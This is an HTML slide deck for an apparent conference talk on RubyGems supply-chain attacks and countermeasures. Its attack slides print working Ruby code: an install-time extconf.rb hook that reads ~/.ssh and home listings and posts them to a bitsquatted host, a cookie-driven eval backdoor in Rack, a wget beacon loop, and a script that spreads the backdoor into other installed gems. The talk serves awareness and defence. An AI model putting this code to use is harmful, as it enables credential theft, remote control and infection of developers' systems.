@@ -1,0 +1,1052 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>How to take over a Ruby gem</title>
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme.css" id="theme">
+		<link rel="stylesheet" href="css/custom.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section data-background-image="img/rgb-object-bg-dark.png" data-background-repeat="repeat">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 25%; background: none;"/>
+          <h1>How to take over a <span style="color: #CF4729">Ruby</span> gem</h1>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Disclaimer</h2>
+
+          <ul>
+            <li>Please don't do that at home</li>
+            <li>There are more challenges related to Ruby gems than those presented</li>
+            <li>You can talk with me during the afterparty to learn more ;)</li>
+            <li>
+              Some of the tools I will be showing aren't yet publicially available, but they will.
+              Haven't had enough time to prepair all of them for that :(
+            </li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>$ whoami --code</h2>
+
+          <p>
+            <a href="http://mensfeld.pl">Maciej Mensfeld</a>
+          </p>
+
+          <p>
+            <ul style="list-style: none; text-align: center;">
+              <li>
+                Software Engineer / Architect
+              </li>
+              <li>
+                <a href="https://github.com/karafka/karafka">Karafka</a> creator
+              </li>
+              <li>
+                OSS contributor (~13 years with Ruby)
+              </li>
+              <img src="img/contr.png" style="border: 1px; width: 100%"/>
+            </ul>
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>$ whoami --work</h2>
+
+          <img src="img/castle.png" style="background: #fff; width: 50%; padding: 20px;"/>
+
+          <h4>
+            End-to-end solution to account takeover attacks
+          </h4>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/krug.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 80%; background: none; width: 50%"/>
+
+          <h5>Kraków Ruby Users Group organizer</h5>
+
+          <ul>
+            <li>One of the biggest Ruby communities in Europe</li>
+            <li>Over <span style="color: #CF4729">1400</span> members</li>
+            <li><span style="color: #CF4729">60-150</span> attendees per event</li>
+            <li>One meeting per month with <span style="color: #CF4729">2-3</span> tech talks</li>
+            <li><span style="color: #CF4729">23</span> sponsors</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/krkrb.png" style="width: 80%;"/>
+
+          <h3><a href="https://krk-rb.pl">krk-rb.pl</a></h3>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>$ whoami --travel</h2>
+
+          <img src="img/travel.png" style="border: 1px; width: 100%"/>
+
+          <h5>9823 km / 20h to reach Tokyo</h5>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+					<h2>$ whoami --japan</h2>
+
+					<ul>
+						<li><span style="color: #CF4729">2nd</span> time at RubyKaigi</li>
+						<li><span style="color: #CF4729">4th</span> time in Japan</li>
+						<li>Kyokushin Karate practitioner</li>
+						<li>Fullmetal Alchemist / 鋼の錬金術師 fan</li>
+					</ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>$ whoami --contact</h2>
+
+          <p>
+            github: <a href="http://github.com/mensfeld">github.com/mensfeld</a> <br>
+            www: <a href="http://mensfeld.pl">mensfeld.pl</a> <br>
+            twitter: <a href="http://twitter.com/maciejmensfeld">@maciejmensfeld</a> <br>
+            e-mail: <a href="mailto:maciej@mensfeld.pl">maciej@mensfeld.pl</a>
+          </p>
+        </section>
+
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>$ whoami --not</h2>
+
+          <img src="img/camera.jpg" style="width: 30%"/>
+        </section>
+
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>RubyKaigi Official Party</h2>
+
+          <p>
+            Talk to me about:
+            <br/>
+            Karafka, Kafka, Ruby, Poland, System Architecture, High throughput data processing,
+            dry-rb, Trailblazer, TCP, Ruby on Rails or <span style="color: #CF4729">anything</span> else TBH :)
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            What do I hope to leave you with
+          </h3>
+
+          <small>
+            RubyGems <span style="color: #CF4729">shouldn't</span> be used lightly, without being aware of the downsides and risks that it brings to the table.
+          </small>
+
+          <small>
+            This session should help you understand risks related to using RubyGems and OSS libraries.
+          </small>
+
+          <small>
+            It should give you also a bit of knowledge on how to countermeasure those risks and how to stay safe investing a sane amount of time.
+          </small>
+
+          <br />
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h1>Agenda</h1>
+          <ul>
+            <li>What is <span style="color: #CF4729">RubyGems</span></li>
+            <li>Risks</li>
+            <li>Attacks</li>
+            <li>Countermeasures</li>
+            </li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 25%; background: none;"/>
+          <h1>
+            <span style="color: #CF4729">RubyGems</span>
+          </h1>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 25%; background: none;"/>
+          <p>
+            <span style="color: #CF4729">RubyGems</span> is a package manager for the Ruby programming language.
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 25%; background: none;"/>
+          <p>
+            Development on
+            <span style="color: #CF4729">RubyGems</span>
+            started in November 2003 and was released to the public on March 14, 2004, or Pi Day 2004.
+          </p>
+
+          <p>
+            It was created by Chad Fowler and Richard Kilmer during RubyConf 2004
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 25%; background: none;"/>
+
+          <p>
+            <ul>
+              <li>Total gems: <span style="color: #CF4729">161 033</span></li>
+              <li>Total users: <span style="color: #CF4729">130 689</span></li>
+              <li>Total downloads: <span style="color: #CF4729">33 595 830 385</span></li>
+              <li>Downloads per second: <span style="color: #CF4729">71</span></li>
+            </ul>
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 20%; background: none;"/>
+          <h2>+</h2>
+          <img src="img/bundler.png" style="width: 45%; background: #fff;"/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h1>Risks</h1>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/onedoesnot.jpeg" style=""/>
+          <p class="fragment">
+            But let's assume one <span style="color: #CF4729">does</span>.
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>So, our gem <span style="color: #CF4729">is</span> installed in the user system. What now?</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>
+            <span style="color: #CF4729">Nothing</span> as long as we don't run it.
+          </h2>
+
+          <h2 class="fragment">
+            <span style="color: #CF4729">Right?</span>
+          </h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/credentials.jpg" style=""/>
+
+          <p>
+            ~/.ssh maybe?
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>Aggregation</h3>
+<pre><code data-trim>
+home = `cd ~; pwd`.gsub("\n", '')
+data = []
+
+Dir.glob("#{home}/.ssh/*", File::FNM_DOTMATCH).each do |file|
+  begin
+    next unless File.file?(file)
+    data << ["--- #{file}", File.read(file)]
+  rescue => e
+    data << e
+    data += e.backtrace
+  end
+end
+
+data.flatten!
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>Data dispatch</h3>
+
+<pre><code data-trim>
+uri = URI.parse("https://subygems.org/secrets")
+https = Net::HTTP.new(uri.host,uri.port).tap { |h| }
+https.use_ssl = true
+req = Net::HTTP::Post.new(uri.path).tap
+req.body = data.flatten.join("\n")
+https.request(req)
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>But the question is:</h3>
+          <h2>Can we even <span style="color: #CF4729">execute</span> the code without running an app?</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Gem#post_install</h2>
+<pre><code data-trim>
+Gem.post_install do
+  steal_and_send!
+end
+</code></pre>
+
+          <small>
+            <a href="https://www.rubydoc.info/github/rubygems/rubygems/Gem.post_install">
+              https://www.rubydoc.info/github/rubygems/rubygems/Gem.post_install
+            </a>
+          </small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Works only for Github</h2>
+          <h2>Does <span style="color: #CF4729">not</span> work for RubyGems</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/seal.jpg" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Rudy failure</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>extensions API to the rescue!</h2>
+<pre><code data-trim>
+Gem::Specification.new do |s|
+  s.name        = 'rubykaigi-via-extconf'
+  s.version     = '1.0.1'
+  # All the gem standard stuff
+  s.extensions << './extconf.rb'
+end
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>extconf.rb</h3>
+
+<pre><code data-trim>
+data = [`cd ~ && ls -all`]
+
+uri = URI.parse("https://subygems.org/secrets")
+https = Net::HTTP.new(uri.host, uri.port)
+https.use_ssl = true
+req = Net::HTTP::Post.new(uri.path)
+req.body = data.join("\n")
+https.request(req)
+
+dummy = "make:\n\t:\ninstall:\n\t:\nclean:\n\t:\n"
+File.write('Makefile', dummy)
+</code></pre>
+
+
+<small>
+  <a href="https://guides.rubygems.org/gems-with-extensions/">https://guides.rubygems.org/gems-with-extensions/</a>
+</small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Demo time</h2>
+          <small>(if I have internet)</small>
+
+<pre><code data-trim>
+          gem install rubykaigi-via-extconf
+</code></pre>
+
+        <p>or</p>
+
+<pre><code data-trim>
+source 'https://rubygems.org'
+
+gem 'rubykaigi-via-extconf'
+
+# bundle --path ./vendor; rm -rf ./vendor
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/ls.png" style="width: 70%; background: #2D0922; padding: 20px;"/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>
+            <span style="color: #CF4729">Installing</span> a gem is enough to make things bad.
+          </h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>But I don't need ssh keys, me wanna a botnet!</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+<pre><code data-trim>
+module RackAttack
+  def call(env)
+    if command = env['HTTP_COOKIE']
+                 .match(/_command=([A-Za-z0-9\=]+)/)[1]
+      Base64
+        .urlsafe_decode64(command)
+        .then(&method(:eval))
+    end
+
+    super
+  end
+end
+
+Rack::Sendfile.prepend RackAttack
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Demo time</h2>
+          <small>(if I have internet)</small>
+
+          <p>
+            Let's print some data to the console remotely :)
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Demo time</h2>
+
+<pre><code data-trim>
+Base64.urlsafe_encode64('puts "OMG!"*10')
+"cHV0cyAiT01HISIqMTA="
+</code></pre>
+
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Demo time</h2>
+
+<pre><code data-trim>
+cmd = <<~CMD
+  $spy ||= Thread.new do
+    loop do
+      sleep(1)
+      `
+        wget 'https://subygems.org/such-wow/\#\{rand\}' \
+        -q -O /dev/null \
+        &> /dev/null
+      `
+    end
+  end
+CMD
+
+Base64.urlsafe_encode64(cmd)
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/demo2.png" style="width: 70%; background: #2D0922; padding: 20px;"/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2><span style="color: #CF4729">Infecting</span> other gems is also dead simple</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+<pre><code data-trim>
+file_location = File.join(
+  File.dirname(__FILE__), 'bot-net-for-rails.rb'
+)
+
+gems_home = File.expand_path(
+  File.join(File.dirname(__FILE__), '../../')
+)
+
+Dir[File.join(gems_home, '**/*.rb')].each do |file|
+  next if File.read(file).include?('RackAttack')
+  `cat '#{file_location}' >> '#{file}'`
+end
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Possibilities are <span style="color: #CF4729">endless</span></h2>
+
+          <h4>
+            Because we <span style="color: #CF4729">allow</span> changes in the already installed gems,
+            a malicious code could easily infect other libraries, while cleaning up itself.
+          </h4>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>
+            It is <span style="color: #CF4729">not</span> a theoretical only problem.
+          </h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h1><span style="color: #CF4729">bootstrap-sass</span></h1>
+          <p>
+            around 2 weeks ago someone used exactly the same approach!
+          </p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>They actually made <span style="color: #CF4729">one</span> huge mistake and I will get to that later...</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>With access to the system, you get <span style="color: #CF4729">unlimited</span> power</h2>
+
+          <p>
+            You can:
+            <ul>
+              <li>Steal data</li>
+              <li>Inject / change resposes</li>
+              <li>Use processes for other purposes</li>
+              <li>Infect other gems</li>
+            </ul>
+          </p>
+        </section>
+
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <p>
+            but...
+          </p>
+          <img src="img/onedoesnot.jpeg" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>RubyGems as a platform is pretty decent</h3>
+
+          <h4>And now due to 2FA it's even better</h4>
+
+          <img src="img/2fa.png" style=""/>
+
+          <h5 class="fragment"><span style="color: #CF4729">However</span>...</h5>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h1>Typosquatting and bitsquatting</h1>
+        </section>
+
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Typosquatting</h2>
+
+          <blockquote>
+Typosquatting, is a form of cybersquatting which relies on mistakes such as typos made by users when inputting a name.
+          </blockquote>
+
+          <small>
+            <a href="https://en.wikipedia.org/wiki/Typosquatting">https://en.wikipedia.org/wiki/Typosquatting</a>
+          </small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          Generating some typos for a gem:
+
+<pre><code data-trim>
+gem install typogen
+
+typogen rspec
+
+spec
+rpec
+rsec
+rspc
+rspe
+srpec
+rpsec
+rsepc
+rspce
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/bndler.png" style="width: 70%;"/>
+
+          <small>
+            <a href="https://rubygems.org/gems/bndler">https://rubygems.org/gems/bndler</a>
+          </small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rials.png" style="width: 70%;"/>
+
+          <small>
+            <a href="https://rubygems.org/gems/rials">https://rubygems.org/gems/rials</a>
+          </small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <ul>
+            <li>Generating malicious gems <span style="color: #CF4729">can</span> be automated really easily</li>
+            <li>RubyGems <span style="color: #CF4729">does not</span> prevent you from registering the gems with names that are typos of popular libraries</li>
+            <li>You can always "book" the names with a non-malicious code just for the future usage</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <ul>
+            <li>sspec</li>
+            <li>sspec-core</li>
+            <li>sspec-support</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Bitsquatting</h2>
+
+          <blockquote>
+            Bitsquatting refers to the registration of a domain names one bit different than a popular domain.
+          </blockquote>
+
+          <small>
+            <a href="http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf"></a>
+          </small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+<pre><code data-trim>
+./bf-lookup rubygems.org
+subygems.org  ns1.yum.pl,ns3.yum.pl
+pubygems.org  ns1.yum.pl,ns3.yum.pl
+vubygems.org  *
+zubygems.org  *
+bubygems.org  *
+2ubygems.org  *
+rtbygems.org  *
+rwbygems.org  *
+rqbygems.org  *
+rebygems.org  *
+rucygems.org  *
+...
+</code></pre>
+
+<small>
+  <a href="https://github.com/bored-engineer/bf-lookup">https://github.com/bored-engineer/bf-lookup</a>
+</small>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+        <h3>So, I bought 4 of them...</h3>
+
+<pre><code data-trim>
+subygems.org
+pubygems.org
+rubigems.org
+rubigams.org
+</code></pre>
+
+<p class="fragment">
+  And for a week there were <span style="color: #CF4729">no</span> bitsquatted requests (luckily)...
+</p>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            But the question remains:
+          </h3>
+
+          <h2>Can and if so, how often, the download requests will bitsquat?</h2>
+
+<pre><code data-trim>
+https://rubygems.org/downloads/rundler-2.0.1.gem
+https://rubygems.org/downloads/jundler-2.0.1.gem
+https://rubygems.org/downloads/bwndler-2.0.1.gem
+https://rubygems.org/downloads/bendler-2.0.1.gem
+https://rubygems.org/downloads/fundler-2.0.1.gem
+...
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Malicious takeover</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            That one is probably more problematic as it comes down to social engineering, rather than attacking the ruby gems as a platform.
+          </h3>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <ul>
+            <li>Targeting a single persons lib is not that hard</li>
+            <li>Ruby has a lot of tools that can help with that</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>
+            <span style="color: #CF4729">How?</span>
+          </h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>By showing an interest</h2>
+
+          <p>
+            There are:
+          </p>
+
+          <ul>
+            <li><span style="color: #CF4729">161 033</span> gems</li>
+            <li><span style="color: #CF4729">1 056 040</span> versions</li>
+            <li><span style="color: #CF4729">5472</span> gems with over <span style="color: #CF4729">100 000</span> downloads</li>
+            <li><span style="color: #CF4729">1 996</span> gems with over <span style="color: #CF4729">1 000 000</span> downloads</li>
+            <li><span style="color: #CF4729">611</span> gems with over <span style="color: #CF4729">10 000 000</span> downloads</li>
+            <li><span style="color: #CF4729">54</span> gems with over <span style="color: #CF4729">100 000 000</span> downloads</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <p>
+            Amongst those with more than <span style="color: #CF4729">100 000</span> downloads
+          </p>
+          <ul>
+            <li><span style="color: #CF4729">3 531</span> weren't updated for at least <span style="color: #CF4729">1</span> year</li>
+            <li><span style="color: #CF4729">2 617</span> weren't updated for at least <span style="color: #CF4729">2</span> years</li>
+            <li><span style="color: #CF4729">1 966</span> weren't updated for at least <span style="color: #CF4729">3</span> years</li>
+            <li><span style="color: #CF4729">1 472</span> weren't updated for at least <span style="color: #CF4729">4</span> years</li>
+            <li><span style="color: #CF4729">1 045</span> weren't updated for at least <span style="color: #CF4729">5</span> years</li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+<pre><code data-trim>
+%w[
+erubis multipart-post orm_adapter http_parser.rb
+rack-ssl chronic journey descendants_tracker inflecto
+colored coercible axiom-types metaclass bcrypt-ruby
+fission cliver vegas rack-mount bundler-unload
+state_machine log4r ruby-hmac fastercsv macaddr
+mono_logger extlib fssm rack-accept
+]
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <ul>
+<li>https://github.com/josh/rack-ssl</li>
+<li>https://github.com/mbj/inflecto</li>
+<li>https://github.com/defunkt/colored</li>
+<li>https://github.com/solnic/coercible</li>
+<li>https://github.com/dkubb/axiom-types</li>
+<li>https://github.com/quirkey/vegas/</li>
+<li>https://github.com/jm/rack-mount</li>
+<li>https://github.com/pluginaweek/state_machine</li>
+<li>https://github.com/ahoward/macaddr</li>
+          </ul>
+        </section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>
+    Making an effort... <span style="color: #CF4729">effortless</span>
+  </h2>
+
+  <ul>
+    <li>Fix invalid permissions in files</li>
+    <li>Detect broken symlinks</li>
+    <li>RuboCop</li>
+    <li>Typos detection</li>
+    <li>Misspellings and additional docs</li>
+    <li>Gem bumps (sic!)</li>
+    <li>Optimizations (via Ducalis, etc)</li>
+    <li>Additional specs</li>
+    <li>Etc...</li>
+  </ul>
+</section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>This is what <span style="color: #CF4729">happened</span> with event-stream</h3>
+
+          <blockquote>
+The event-stream module was originally by Dominic Tarr, who maintained the library before handing it to a contributor. Tarr indicated that he has not used the module and transferred its ownership after he received an email regarding its maintenance.
+          </blockquote>
+        </section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>And when you finally get <span style="color: #CF4729">release</span> permissions...</h2>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>Make it real!</h2>
+
+  <blockquote>
+<ul>
+<li>I couldn’t find 3.2.0.3 in the GitHub repo</li>
+<li>I couldn’t find any mention of the version in any issues or changelogs</li>
+<li>I couldn’t find any mention of the gem being yanked by the owners of the project</li>
+</ul>
+  </blockquote>
+
+  <small>
+    <a href="https://dgb.github.io/2019/04/05/bootstrap-sass-backdoor.html">https://dgb.github.io/2019/04/05/bootstrap-sass-backdoor.html</a>
+  </small>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>
+    It is critical to remember, that there is <span style="color: #CF4729">no relationship</span> in between RubyGems and Github.
+  </h2>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h1>Countermeasures</h1>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <img src="img/hack.jpg" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <blockquote>
+    Yoshitaka Sakurada, the minister for cybersecurity who recently confessed that he does not use computers, has now told a Diet committee that he is not very familiar with cybersecurity issues.
+  </blockquote>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <img src="img/implement.jpg" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>There is <span style="color: #CF4729">no</span> general solution to all the problems</h2>
+  <h4>And I feel, that due to dynamic nature of Ruby, there won't be...</h4>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>Typosquatting and friends</h2>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>Needleman–Wunsch and Levenstein algorithms</h2>
+
+  <ul>
+    <li>
+      Typos are made mostly on QWERTY keyboards
+    </li>
+    <li>
+      So, we just need to adjust the algorithm, run in for our gemfile and it should be fine, right?
+    </li>
+  </ul>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h3>There are <span style="color: #CF4729">too many</span> gems in RubyGems that are similar :(</h3>
+  <h4>And many of them are related to one another</h4>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h3>We need to be a bit more clever</h3>
+  <img src="img/math.gif" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <ul>
+    <li>Popular gems aren't typosquatts</li>
+    <li>Popular gems that could be typosquatts of other popular gems probably aren't</li>
+    <li>We can check the gems dependencies relationship</li>
+    <li>If there's a big popularity disperse we should rely on a distance algorithms</li>
+    <li>It would be good to check deps of deps as well</li>
+  </ul>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <img src="img/sspec.png" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>Abandoned gems</h2>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <img src="img/gretel1.png" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <img src="img/gretel2.png" style=""/>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>Malicious takeovers and gem releases</h2>
+</section>
+
+<section data-background-image="img/rgb-object-bg-dark.png">
+  <h2>We should <span style="color: #CF4729">prevent</span> installing gems without checking them</h2>
+</section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/rubygems.png" style="border: none; box-shadow: 0 0 0 0 #fff; width: 20%; background: none;"/>
+          <h2>Bumping policy</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+<pre><code data-trim>
+rm Gemfile.lock
+bundle
+bundle exec rspec spec
+git add ./
+git commit -m "gem bump"
+git push origin master
+</code></pre>
+
+<p>vs</p>
+
+<pre><code data-trim>
+bundle outdated
+bundle update XYZ
+bundle exec rspec spec
+git add ./
+git commit -m "gem bump"
+git push origin master
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2><span style="color: #CF4729">Both</span> are bad!</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            You're <span style="color: #CF4729">not</span> suppose to even install the upgraded libs without
+            <span style="color: #CF4729">carefully</span> reviewing the code.
+          </h3>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>All the "automatic" dependency management tools that PR updates are <span style="color: #CF4729">really bad</span>
+            by design if you don't have an isolated multi-stage CI flow (for private repos).
+          </h3>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            Many companies use the same ENV for running specs, building containers, pushing things, etc.
+          </h3>
+
+<pre><code data-trim>
+ENV.map { |a, v| [a,v] }.to_s
+</code></pre>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>
+            That's why it's better to
+            <span style="color: #CF4729">always</span>
+            review bumps before installing them.
+          </h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Reviewing RubyGems code <span style="color: #CF4729">needs</span> to happen based on RubyGems data</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Github is <span style="color: #CF4729">not</span> a proper place to do that.</h2>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>Introducing the Gems Differ</h2>
+
+          <h1>
+            <a href="diff.coditsu.io">diff.coditsu.io</a>
+          </h1>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/diff1.png" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/diff2.png" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <img src="img/diff3.png" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>
+            So now, the only thing that is missing is a notifications engine that does not bump things...
+          </h3>
+
+          <img src="img/coditsu.png" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h3>Introducing</h3>
+          <img src="img/coditsu.svg" style="background: none; border: none; box-shadow: 0 0 0 0 #fff; width: 100%;"/>
+        </section>
+
+        <section>
+          <h3>
+            <small>(soon to be)</small> Open dockerized platform for all of that and more</h3>
+
+          <p>Demo:</p>
+
+          <h4>
+            <a href="https://app.coditsu.io/karafka">https://app.coditsu.io/karafka</a>
+          </h4>
+        </section>
+
+        <section>
+          <img src="img/coditsu2.png" style=""/>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+          <h2>READ MORE</h2>
+
+          <ul>
+            <li><a href="https://diff.coditsu.io">diff.coditsu.io</a></li>
+            <li><a href="https://github.com/coditsu/">github.com/coditsu</a></li>
+            <li><a href="https://dgb.github.io/2019/04/05/bootstrap-sass-backdoor.html">bootstrap-sass-backdoor</a></li>
+            <li><a href="https://github.com/mensfeld/taking-over-a-gem">taking-over-a-gem</a></li>
+          </ul>
+        </section>
+
+        <section data-background-image="img/rgb-object-bg-dark.png">
+
+          <h2>THE END</h2>
+
+          <ul style="text-align: center; list-style: none;">
+            <li>www: <a href="https://github.com/coditsu">github.com/coditsu</a></li>
+            <li>email: <a href="mailto:maciej@mensfeld.pl">maciej@mensfeld.pl</a></li>
+            <li>twitter: <a href="http://twitter.com/maciejmensfeld">@maciejmensfeld</a></li>
+          </ul>
+        </section>
